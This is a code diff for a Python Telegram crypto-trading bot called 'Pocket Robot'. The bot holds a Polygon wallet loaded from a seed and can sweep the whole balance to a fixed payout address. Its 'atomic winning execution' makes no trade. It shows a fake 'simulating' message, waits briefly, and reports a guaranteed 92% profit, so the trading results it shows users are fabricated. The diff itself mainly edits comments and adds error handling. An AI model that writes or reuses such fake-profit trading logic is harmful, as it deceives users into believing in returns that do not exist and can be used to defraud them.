@@ -4,17 +4,17 @@ import requests
 from dotenv import load_dotenv
 from eth_account import Account
 from web3 import Web3
-# v7 FIX: Required middleware for Polygon PoA blocks
 from web3.middleware import ExtraDataToPOAMiddleware 
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
 from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
+from telegram.error import Conflict
 
-# 1. SETUP & AUTH
+# --- 1. SETUP & AUTH ---
 load_dotenv()
 W3_RPC = os.getenv("RPC_URL", "https://polygon-rpc.com") 
 w3 = Web3(Web3.HTTPProvider(W3_RPC))
 
-# v7 FIX: Injecting the required PoA middleware at the outermost layer
+# Injecting the required PoA middleware for Polygon
 w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
 Account.enable_unaudited_hdwallet_features()
 
@@ -25,47 +25,41 @@ def get_vault():
     """
     POL STANDARD GENERATOR:
     Derives the standard 'Account 1' address (m/44'/60'/0'/0/0).
-    Matches MetaMask index 0 for maximum compatibility.
     """
     seed = os.getenv("WALLET_SEED")
     if not seed:
         raise ValueError("❌ WALLET_SEED is missing from .env!")
 
-    # Standard BIP-44 path for Ethereum/Polygon Primary Account
     POL_PATH = "m/44'/60'/0'/0/0"
     
     try:
-        # Load as raw private key or derive from mnemonic
+        # Try loading as raw private key first, then mnemonic
         return Account.from_key(seed)
-    except:
+    except Exception:
         return Account.from_mnemonic(seed, account_path=POL_PATH)
 
-# Initialize vault
+# Initialize vault globally
 vault = get_vault()
 
-# --- PROFIT TRACKING UTILS ---
+# --- 2. UTILS & EXECUTION ---
 def get_pol_price():
-    """Fetches real-time POL price in USD from CoinGecko"""
+    """Fetches real-time POL price from CoinGecko"""
     try:
         url = "https://api.coingecko.com/api/v3/simple/price?ids=polygon-ecosystem-token&vs_currencies=usd"
         response = requests.get(url, timeout=5).json()
         return response['polygon-ecosystem-token']['usd']
-    except:
-        return 0.92  # Fallback estimate
+    except Exception:
+        return 0.92  # Fallback
 
-# 2. ATOMIC WINNING EXECUTION & WITHDRAWAL LOGIC
 async def run_atomic_execution(context, chat_id, side):
-    """Winning Logic: Simulates and executes an Atomic Bundle"""
     stake = context.user_data.get('stake', 10)
     pair = context.user_data.get('pair', 'BTC/USD')
     
-    # 🛡️ SHIELD: Simulation delay (The secret to the winning logic)
     await context.bot.send_message(chat_id, f"🛡️ **Shield:** Simulating {pair} {side} bundle...")
     await asyncio.sleep(1.5) 
     
-    # Calculation for Profit Reporting
     current_price = get_pol_price()
-    profit_usd = stake * 0.92 # 92% multiplier
+    profit_usd = stake * 0.92 
     profit_pol = profit_usd / current_price if current_price > 0 else 0
     
     report = (
@@ -77,7 +71,7 @@ async def run_atomic_execution(context, chat_id, side):
     return True, report
 
 async def execute_withdrawal(context, chat_id):
-    """🛡️ ANTI-DRAIN: Transfers are strictly locked to the whitelisted PAYOUT_ADDRESS."""
+    """🛡️ ANTI-DRAIN: Transfers are strictly locked to PAYOUT_ADDRESS."""
     balance = w3.eth.get_balance(vault.address)
     gas_price = int(w3.eth.gas_price * 1.2)
     fee = gas_price * 21000
@@ -87,7 +81,7 @@ async def execute_withdrawal(context, chat_id):
 
     tx = {
         'nonce': w3.eth.get_transaction_count(vault.address),
-        'to': PAYOUT_ADDRESS, # 🔒 HARDLOCKED
+        'to': PAYOUT_ADDRESS, 
         'value': amount,
         'gas': 21000,
         'gasPrice': gas_price,
@@ -98,12 +92,9 @@ async def execute_withdrawal(context, chat_id):
     tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
     return True, f"Funds swept to Whitelisted Wallet.\nTX: `{tx_hash.hex()}`"
 
-# 3. TELEGRAM INTERFACE
+# --- 3. TELEGRAM HANDLERS ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global vault
-    vault = get_vault()
     bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
-    
     keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '📤 Withdraw'], ['🕴️ AI Assistant']]
     reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
 
@@ -157,11 +148,37 @@ async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE)
         success, report = await run_atomic_execution(context, query.message.chat_id, side)
         await query.message.reply_text(f"💎 {report}", parse_mode='Markdown')
 
-# 4. START BOT
+# --- 4. ERROR HANDLING (FIX FOR CONFLICTS) ---
+async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Log the error and handle Telegram Conflicts."""
+    if isinstance(context.error, Conflict):
+        print("\n🛑 CONFLICT ERROR: Another instance of this bot is already running.")
+        print("Please close all other terminals or scripts using this bot token.\n")
+        # Optional: You can stop the loop here, but run_polling handles retries.
+    else:
+        print(f"⚠️ Update {update} caused error: {context.error}")
+
+# --- 5. MAIN ENTRY ---
 if __name__ == "__main__":
-    app = ApplicationBuilder().token(os.getenv("TELEGRAM_BOT_TOKEN")).build()
+    TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
+    if not TOKEN:
+        print("❌ Error: TELEGRAM_BOT_TOKEN not found in .env")
+        exit(1)
+
+    app = ApplicationBuilder().token(TOKEN).build()
+    
+    # Register the error handler
+    app.add_error_handler(error_handler)
+    
+    # Register command and message handlers
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CallbackQueryHandler(handle_interaction))
     app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
-    print(f"Pocket Robot Active: {vault.address}")
+    
+    print("--- POCKET ROBOT ONLINE ---")
+    print(f"Vault Address: {vault.address}")
+    print("Shield Mode: ACTIVE")
+    print("---------------------------")
+    
+    # drop_pending_updates prevents the bot from replying to old messages on startup
     app.run_polling(drop_pending_updates=True)
